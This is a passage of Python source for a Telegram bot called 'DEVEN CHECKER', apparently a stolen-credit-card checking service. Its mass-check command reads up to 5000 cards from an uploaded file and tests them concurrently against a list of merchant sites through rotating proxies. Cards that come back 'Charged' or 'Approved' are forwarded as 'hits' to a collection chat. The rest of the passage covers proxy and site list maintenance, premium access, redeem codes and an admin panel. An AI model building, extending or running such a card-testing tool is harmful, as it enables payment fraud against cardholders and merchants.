    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    """Remove all proxies from proxy.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    current_proxies = load_proxies()
    count = len(current_proxies)
    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(
            premium_emoji(
                f"📦 <b>Backup Created!</b>\n\n"
                f"Sending backup of {count} proxies before clearing..."
            ),
            file=backup_filename,
            parse_mode='html'
        )
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as exc:
        await event.reply(premium_emoji(f"❌ Error creating backup: {exc}"), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')
@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    """Get all proxies from proxy.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass
@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    """Command to add proxies to proxy.txt (reply to .txt or type inline)"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return
    try:
        proxies_to_add = []
        if event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg.file and reply_msg.file.name.endswith('.txt'):
                file_bytes = await reply_msg.download_media(bytes)
                content = file_bytes.decode('utf-8', errors='ignore')
                proxies_to_add = [line.strip() for line in content.split('\n') if line.strip()]
        if not proxies_to_add:
            args = event.message.text.split('\n')
            if len(args) < 2:
                await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies one per line, or reply to a .txt file."))
                return
            proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."))
            return
        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]
        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."))
            return
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."))
    except Exception as exc:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {exc}"))
@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    """Command to remove a site from sites.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return
    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return
        url_to_remove = args[1].strip()
        current_sites = load_sites()
        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"))
            return
        new_sites = [site for site in current_sites if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")
        await event.reply(premium_emoji(f"✅ **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))
    except Exception as exc:
        await event.reply(premium_emoji(f"❌ Error removing site: {exc}"))
@bot.on(events.NewMessage(pattern='/msh'))
async def check_command(event):
    """Main check command"""
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(f"{EMOJI['danger']} Please reply to a .txt file containing cards......"))
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji(f"{EMOJI['danger']} Please reply to a .txt file."))
        return
    if not load_sites():
        await event.reply(premium_emoji("❌ No sites available. Please contact admin."))
        return
    if not load_proxies():
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return
    status_msg = await event.reply(premium_emoji(f"⚙️ 𝗔𝗻𝗮𝗹𝘆𝘇𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀 ....."))
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    if not cards:
        await status_msg.edit(premium_emoji(f"{EMOJI['danger']} No valid cards found in file."))
        os.remove(file_path)
        return
    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"⚡ File contains {len(cards)} cards. Limiting to first 5000 cards."))
        cards = cards[:5000]
    os.remove(file_path)
    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"⚙️ 𝗔𝗻𝗮𝗹𝘆𝘇𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘅 ....."))
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]
        async def worker():
            worker_sites = list(load_sites())
            worker_proxies = list(load_proxies())
            if not worker_sites or not worker_proxies:
                return
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                if not worker_sites or not worker_proxies:
                    break
                res = await check_card_with_retry(card, worker_sites, worker_proxies, max_retries=5)
                all_results['checked'] += 1
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                else:
                    all_results['dead'].append(res)
                queue.task_done()
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass
        workers = [asyncio.create_task(worker()) for _ in range(20)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
    except Exception as exc:
        await bot.send_message(user_id, premium_emoji(f"An error occurred: {exc}"))
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)
@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    """Check all proxies and remove dead ones using a test card and site"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."))
        return
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."))
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking proxies...\n\n"
                    f"<b>Checked:</b> {min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}\n"
                    f"<b>Alive:</b> {len(alive_proxies)}\n"
                    f"<b>Dead:</b> {len(dead_proxies)}"
                ),
                parse_mode='html'
            )
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n"
        summary_msg += f"<b>Total Proxies:</b> {len(proxies)}\n"
        summary_msg += f"<b>Alive:</b> {len(alive_proxies)}\n"
        summary_msg += f"<b>Removed:</b> {len(dead_proxies)}\n\n"
        summary_msg += "<code>proxy.txt</code> has been updated with only working proxies."
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
    except Exception as exc:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during proxy check: {exc}"))
@bot.on(events.NewMessage(pattern='/fuck'))
async def site_command(event):
    """Check all sites and remove dead ones"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."))
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return
    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))
    alive_sites = []
    dead_sites = []
    batch_size = 10
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: fresh_proxies = proxies
            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking sites...\n\n"
                    f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                    f"<b>Alive:</b> {len(alive_sites)}\n"
                    f"<b>Dead:</b> {len(dead_sites)}"
                ),
                parse_mode='html'
            )
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        summary_msg = f"✅ <b>Site Check Complete!</b>\n\n"
        summary_msg += f"<b>Total Sites:</b> {len(sites)}\n"
        summary_msg += f"<b>Alive:</b> {len(alive_sites)}\n"
        summary_msg += f"<b>Removed:</b> {len(dead_sites)}\n\n"
        summary_msg += "<code>sites.txt</code> has been updated."
        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')
    except Exception as exc:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during site check: {exc}"))
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("⏸️ Paused"))
@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("▶️ Resumed"))
@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji(f"{EMOJI['stopped']} Stopped"))
        await event.edit(premium_emoji(f"{EMOJI['danger']} <b>Checking stopped by user.</b>"), parse_mode='html')
_start_time = time.time()
ADMIN_ID = [6699193683]
HIT_CHAT_FILE = 'hit_chat.txt'
DEFAULT_HIT_CHAT_ID = -1003957527279
from admin_panel import (
    admin_main_menu_text, get_admin_keyboard,
    admin_users_text, get_users_keyboard,
    admin_sites_text, get_sites_keyboard,
    admin_stats_text, get_stats_keyboard,
    admin_control_text, get_control_keyboard,
    admin_hits_text, get_hits_keyboard,
    admin_proxies_text, get_proxies_keyboard,
    get_back_keyboard,
)
def load_hit_chat_id():
    try:
        lines = [l.strip() for l in open(HIT_CHAT_FILE).read().splitlines() if l.strip()]
        if lines:
            return int(lines[0])
    except:
        pass
    return DEFAULT_HIT_CHAT_ID
def save_hit_chat_id(chat_id):
    with open(HIT_CHAT_FILE, 'w') as f:
        f.write(str(chat_id))
HIT_CHAT_ID = load_hit_chat_id()
def load_banned_users():
    try:
        return [l.strip() for l in open('banned.txt').read().splitlines() if l.strip()]
    except:
        return []
def is_banned(user_id):
    return str(user_id) in load_banned_users()
def add_banned_user(user_id):
    banned = load_banned_users()
    uid = str(user_id)
    if uid not in banned:
        banned.append(uid)
        with open('banned.txt', 'w') as f:
            for u in banned:
                f.write(f"{u}\n")
def remove_banned_user(user_id):
    banned = load_banned_users()
    uid = str(user_id)
    if uid in banned:
        banned.remove(uid)
        with open('banned.txt', 'w') as f:
            for u in banned:
                f.write(f"{u}\n")
def load_premium_users():
    try:
        return [l.strip().split('|')[0] for l in open(PREMIUM_FILE).read().splitlines() if l.strip()]
    except:
        return []
def add_premium_user(user_id):
    uid = str(user_id)
    if is_premium(uid):
        return
    with open(PREMIUM_FILE, 'a') as f:
        f.write(uid + '\n')
def remove_premium_user(user_id):
    uid = str(user_id)
    try:
        with open(PREMIUM_FILE, 'r') as f:
            all_lines = [l.strip() for l in f if l.strip()]
        with open(PREMIUM_FILE, 'w') as f:
            for ln in all_lines:
                if ln.split('|')[0] != uid:
                    f.write(ln + '\n')
    except:
        pass
def load_sites_sync():
    try:
        return [l.strip() for l in open(SITES_FILE).read().splitlines() if l.strip()]
    except:
        return []
def load_proxies_sync():
    try:
        return [l.strip() for l in open(PROXY_FILE).read().splitlines() if l.strip()]
    except:
        return []
async def safe_edit(event, text, buttons=None, parse_mode='html'):
    try:
        if buttons:
            await event.edit(text, buttons=buttons, parse_mode=parse_mode)
        else:
            await event.edit(text, parse_mode=parse_mode)
    except:
        pass
@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    await event.answer()
    first_name = event.sender.first_name or "User"
    uid = event.sender_id
    btn_icon = emoji_id("num_2")
    buttons = [
        [Button.inline(" 𝗖𝗠𝗗 ", b"show_cmds", icon=btn_icon, style="primary"),
         Button.inline(" 𝗦𝗜𝗧𝗘𝗦 ", b"show_sites", icon=btn_icon, style="primary")],
        [Button.inline(" 𝗣𝗥𝗢𝗫𝗬 ", b"show_proxy", icon=btn_icon, style="primary")],
    ]
    if uid in ADMIN_ID:
        buttons.append([Button.inline(" 𝗔𝗗𝗠𝗜𝗡 ", b"admin_panel", icon=btn_icon, style="primary")])
    text = f"""{EMOJI['welcome']} <b>DEVEN CHECKER</b>
hey , <b>{bold(first_name)}</b> {EMOJI['bolt']}
  ┣ {EMOJI['card']} <b>Single</b> → <code>/sh</code>, <code>/st1</code>, <code>/str1</code>
  ┣ {EMOJI['folder']} <b>Mass</b> → <code>/msh</code>, <code>/mst1</code>, <code>/mstr1</code>
  ┣ {EMOJI['wrench']} <b>Proxy</b> → <code>/proxy</code>
  ┗ {EMOJI['globe']} <b>Sites</b> → <code>/site</code> / <code>/fuck</code>
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    await safe_edit(event, text, buttons=buttons)
@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_cmds_callback(event):
    await event.answer()
    text = f"""{EMOJI['clipboard']} <b>COMMANDS</b>
{DIV}
  ┣ {EMOJI['card']} <b>Single:</b>
  ┃   ├── <code>/sh</code>
  ┃   ├── <code>/st1</code>
  ┃   └── <code>/str1</code>
  ┃   ├── <b>Mass</b>
  ┃   ├── <code>/msh</code>
  ┃   ├── <code>/mst1</code>
  ┃   └── <code>/mstr1</code>
  ┣ {EMOJI['wrench']} <b>Proxy:</b>
  ┃   └── <code>/proxy</code> — Clean
  ┃   └── <code>/addproxy</code> — Add
  ┣ {EMOJI['globe']} <b>Sites:</b>
  ┃   └── <code>/site</code> — Clean
  ┃   └── <code>/rm url</code> — Remove
  ┗ {EMOJI['gear']} <b>Admin:</b>
      └── <code>/admin</code>
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    back_icon = emoji_id('back')
    back_btn = Button.inline(f" {bold('Back')} ", b"main_menu", icon=back_icon)
    await safe_edit(event, text, buttons=[[back_btn]])
@bot.on(events.CallbackQuery(data=b"show_sites"))
async def show_sites_callback(event):
    await event.answer()
    sites = load_sites()
    count = len(sites)
    text = f"""{EMOJI['globe']} <b>SITES</b>
{DIV}
{EMOJI['stats']} Total sites: <code>{count}</code>
┣ <code>/site</code> — Check & clean dead
┣ <code>/fuck</code> — Check & remove bad
┗ <code>/rm url</code> — Remove specific
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    back_icon = emoji_id('back')
    back_btn = Button.inline(f" {bold('Back')} ", b"main_menu", icon=back_icon)
    await safe_edit(event, text, buttons=[[back_btn]])
@bot.on(events.CallbackQuery(data=b"show_proxy"))
async def show_proxy_callback(event):
    await event.answer()
    proxies = load_proxies()
    count = len(proxies)
    text = f"""{EMOJI['globe']} <b>PROXY</b>
{DIV}
{EMOJI['stats']} Total proxies: <code>{count}</code>
┣ <code>/proxy</code> — Check & clean dead
┣ <code>/addproxy</code> — Add (txt supported)
┗ <code>/getproxy</code> — Download proxy.txt
{DIV}
Made by <a href="https://t.me/zyokt">𝐃𝐞𝐯𝐞𝐧</a>"""
    back_icon = emoji_id('back')
    back_btn = Button.inline(f" {bold('Back')} ", b"main_menu", icon=back_icon)
    await safe_edit(event, text, buttons=[[back_btn]])
@bot.on(events.NewMessage(pattern='/admin'))
async def admin_panel_entry(event):
    if event.sender_id not in ADMIN_ID:
        return
    text = admin_main_menu_text()
    await event.reply(premium_emoji(text), buttons=get_admin_keyboard(), parse_mode='html')
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    text = admin_main_menu_text()
    await safe_edit(event, premium_emoji(text), buttons=get_admin_keyboard())
@bot.on(events.CallbackQuery(data=b"admin_users"))
async def admin_users_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    premium = load_premium_users()
    banned = load_banned_users()
    text = admin_users_text(len(premium), len(banned))
    await safe_edit(event, premium_emoji(text), buttons=get_users_keyboard())
@bot.on(events.CallbackQuery(data=b"admin_add_premium"))
async def admin_add_premium_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    async with event.client.conversation(event.sender_id) as conv:
        await conv.send_message(premium_emoji("Send user ID or @username to add as premium:"))
        resp = await conv.get_response()
        target_id, target_label, error = await resolve_user_reference(resp.text.strip())
        if error:
            await resp.reply(premium_emoji(f"❌ {error}"))
        else:
            add_premium_user(target_id)
            await resp.reply(premium_emoji(f"✅ Added {target_label} as premium."))
    await admin_users_callback(event)
@bot.on(events.CallbackQuery(data=b"admin_remove_premium"))
async def admin_remove_premium_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    async with event.client.conversation(event.sender_id) as conv:
        await conv.send_message(premium_emoji("Send user ID or @username to remove from premium:"))
        resp = await conv.get_response()
        target_id, target_label, error = await resolve_user_reference(resp.text.strip())
        if error:
            await resp.reply(premium_emoji(f"❌ {error}"))
        else:
            remove_premium_user(target_id)
            await resp.reply(premium_emoji(f"✅ Removed {target_label} from premium."))
    await admin_users_callback(event)
@bot.on(events.CallbackQuery(data=b"admin_ban_user"))
async def admin_ban_user_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    async with event.client.conversation(event.sender_id) as conv:
        await conv.send_message(premium_emoji("Send user ID or @username to ban:"))
        resp = await conv.get_response()
        target_id, target_label, error = await resolve_user_reference(resp.text.strip())
        if error:
            await resp.reply(premium_emoji(f"❌ {error}"))
        else:
            add_banned_user(target_id)
            remove_premium_user(target_id)
            await resp.reply(premium_emoji(f"✅ Banned {target_label}."))
    await admin_users_callback(event)
@bot.on(events.CallbackQuery(data=b"admin_unban_user"))
async def admin_unban_user_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    async with event.client.conversation(event.sender_id) as conv:
        await conv.send_message(premium_emoji("Send user ID or @username to unban:"))
        resp = await conv.get_response()
        target_id, target_label, error = await resolve_user_reference(resp.text.strip())
        if error:
            await resp.reply(premium_emoji(f"❌ {error}"))
        else:
            remove_banned_user(target_id)
            await resp.reply(premium_emoji(f"✅ Unbanned {target_label}."))
    await admin_users_callback(event)
@bot.on(events.CallbackQuery(data=b"admin_list_premium"))
async def admin_list_premium_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    users = load_premium_users()
    if not users:
        text = "<b>📋 Premium Users</b>\n\nNo premium users."
    else:
        text = "<b>📋 Premium Users</b>\n\n" + "\n".join(f"• <code>{u}</code>" for u in users)
    await safe_edit(event, premium_emoji(text), buttons=get_back_keyboard(b"admin_users"))
@bot.on(events.CallbackQuery(data=b"admin_list_banned"))
async def admin_list_banned_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    users = load_banned_users()
    if not users:
        text = "<b>📋 Banned Users</b>\n\nNo banned users."
    else:
        text = "<b>📋 Banned Users</b>\n\n" + "\n".join(f"• <code>{u}</code>" for u in users)
    await safe_edit(event, premium_emoji(text), buttons=get_back_keyboard(b"admin_users"))
@bot.on(events.CallbackQuery(data=b"admin_sites"))
async def admin_sites_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    sites = load_sites_sync()
    text = admin_sites_text(len(sites))
    await safe_edit(event, premium_emoji(text), buttons=get_sites_keyboard())
@bot.on(events.CallbackQuery(data=b"admin_add_site"))
async def admin_add_site_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    async with event.client.conversation(event.sender_id) as conv:
        await conv.send_message(premium_emoji("Send the site URL to add:"))
        resp = await conv.get_response()
        site = resp.text.strip()
        if site:
            sites = load_sites_sync()
            if site not in sites:
                with open(SITES_FILE, 'a') as f:
                    f.write(f"{site}\n")
                await resp.reply(premium_emoji(f"✅ Added <code>{site}</code>."))
            else:
                await resp.reply(premium_emoji("⚠️ Site already exists."))
        else:
            await resp.reply(premium_emoji("❌ Invalid URL."))
    await admin_sites_callback(event)
@bot.on(events.CallbackQuery(data=b"admin_remove_site"))
async def admin_remove_site_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    async with event.client.conversation(event.sender_id) as conv:
        await conv.send_message(premium_emoji("Send the site URL to remove:"))
        resp = await conv.get_response()
        site = resp.text.strip()
        if site:
            sites = load_sites_sync()
            if site in sites:
                sites.remove(site)
                with open(SITES_FILE, 'w') as f:
                    for s in sites:
                        f.write(f"{s}\n")
                await resp.reply(premium_emoji(f"✅ Removed <code>{site}</code>."))
            else:
                await resp.reply(premium_emoji("❌ Site not found."))
        else:
            await resp.reply(premium_emoji("❌ Invalid URL."))
    await admin_sites_callback(event)
@bot.on(events.CallbackQuery(data=b"admin_list_sites"))
async def admin_list_sites_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    sites = load_sites_sync()
    if not sites:
        text = "<b>🌐 Sites</b>\n\nNo sites."
    else:
        text = "<b>🌐 Sites</b>\n\n" + "\n".join(f"• <code>{s}</code>" for s in sites[:50])
        if len(sites) > 50:
            text += f"\n... and {len(sites) - 50} more"
    await safe_edit(event, premium_emoji(text), buttons=get_back_keyboard(b"admin_sites"))
@bot.on(events.CallbackQuery(data=b"admin_stats"))
async def admin_stats_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    premium = len(load_premium_users())
    banned = len(load_banned_users())
    sites = len(load_sites_sync())
    proxies = len(load_proxies_sync())
    uptime_seconds = int(time.time() - _start_time)
    hours = uptime_seconds // 3600
    minutes = (uptime_seconds % 3600) // 60
    uptime_str = f"{hours}h {minutes}m" if uptime_seconds else "N/A"
    text = admin_stats_text(premium, banned, sites, proxies, uptime_str)
    await safe_edit(event, premium_emoji(text), buttons=get_stats_keyboard())
@bot.on(events.CallbackQuery(data=b"admin_bot_control"))
async def admin_control_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    text = admin_control_text()
    await safe_edit(event, premium_emoji(text), buttons=get_control_keyboard())
@bot.on(events.CallbackQuery(data=b"admin_restart"))
async def admin_restart_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    btn_icon_progress = emoji_id("num_2")
    buttons = [
        [green_btn(f" {bold('Yes, Restart')} ", b"confirm_restart_yes", icon=btn_icon_progress)],
        [red_btn(f" {bold('No')} ", b"admin_panel", icon=btn_icon_progress)],
    ]
    await safe_edit(event, premium_emoji("⚠️ <b>Are you sure you want to restart?</b>"), buttons=buttons)
@bot.on(events.CallbackQuery(data=b"confirm_restart_yes"))
async def confirm_restart_yes_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    await safe_edit(event, premium_emoji("🔄 <b>Restarting bot...</b>"))
    try:
        import subprocess, sys
        sys.stdout.flush()
        subprocess.run(['sudo', 'systemctl', 'restart', 'deven-bot.service'], timeout=10)
    except:
        pass
@bot.on(events.CallbackQuery(data=b"admin_backup"))
async def admin_backup_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    try:
        from datetime import datetime
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_{ts}.tar.gz"
        import subprocess
        subprocess.run(['tar', '-czf', backup_name, 'bot.py', 'premium.txt', 'sites.txt', 'proxy.txt', 'banned.txt', 'hit_chat.txt', 'functions', 'admin_panel.py'], timeout=30)
        await bot.send_message(event.sender_id, "✅ Backup created.", file=backup_name)
        subprocess.run(['rm', '-f', backup_name])
    except Exception as exc:
        await safe_edit(event, premium_emoji(f"❌ Backup failed: {exc}"), buttons=get_back_keyboard(b"admin_bot_control"))
@bot.on(events.CallbackQuery(data=b"admin_hit_settings"))
async def admin_hits_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    global HIT_CHAT_ID
    HIT_CHAT_ID = load_hit_chat_id()
    text = admin_hits_text(HIT_CHAT_ID)
    await safe_edit(event, premium_emoji(text), buttons=get_hits_keyboard())
@bot.on(events.NewMessage(pattern='/sethitchat'))
async def set_hit_chat_command(event):
    if event.sender_id not in ADMIN_ID:
        return
    global HIT_CHAT_ID
    if event.is_reply:
        reply = await event.get_reply_message()
        HIT_CHAT_ID = reply.chat_id
    else:
        try:
            HIT_CHAT_ID = int(event.message.text.split()[1])
        except:
            await event.reply(premium_emoji("Usage: /sethitchat &lt;chat_id&gt; or reply to a message in the target chat."))
            return
    save_hit_chat_id(HIT_CHAT_ID)
    await event.reply(premium_emoji(f"✅ Hit chat set to <code>{HIT_CHAT_ID}</code>."))
@bot.on(events.CallbackQuery(data=b"admin_proxy_settings"))
async def admin_proxies_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    proxies = load_proxies_sync()
    text = admin_proxies_text(len(proxies))
    await safe_edit(event, premium_emoji(text), buttons=get_proxies_keyboard())
@bot.on(events.CallbackQuery(data=b"admin_list_proxies"))
async def admin_list_proxies_callback(event):
    if event.sender_id not in ADMIN_ID:
        return
    proxies = load_proxies_sync()
    if not proxies:
        text = "<b>🔌 Proxies</b>\n\nNo proxies."
    else:
        text = "<b>🔌 Proxies</b>\n\n" + "\n".join(f"• <code>{p}</code>" for p in proxies[:30])
        if len(proxies) > 30:
            text += f"\n... and {len(proxies) - 30} more"
    await safe_edit(event, premium_emoji(text), buttons=get_back_keyboard(b"admin_proxy_settings"))
@bot.on(events.NewMessage(pattern=r'/redeem(?:\s+(.+))?'))
async def redeem_cmd(event):
    uid = event.sender_id
    text_match = event.pattern_match
    code = text_match.group(1) if text_match and text_match.group(1) else None
    if not code:
        await event.reply(f"{EMOJI['warning']} <b>Usage:</b> <code>/redeem CODE</code>\n\n{EMOJI['bolt']} Paste your redeem code to activate premium.", parse_mode='html')
        return
    result = redeem_code(code, uid)
    if result['success']:
        expiry_str = result.get('expiry', 'N/A')
        text = f"""{EMOJI['crown']} <b>Redeem Successful!</b>
{EMOJI['bolt']} Plan: <b>{result['plan'].upper()}</b>
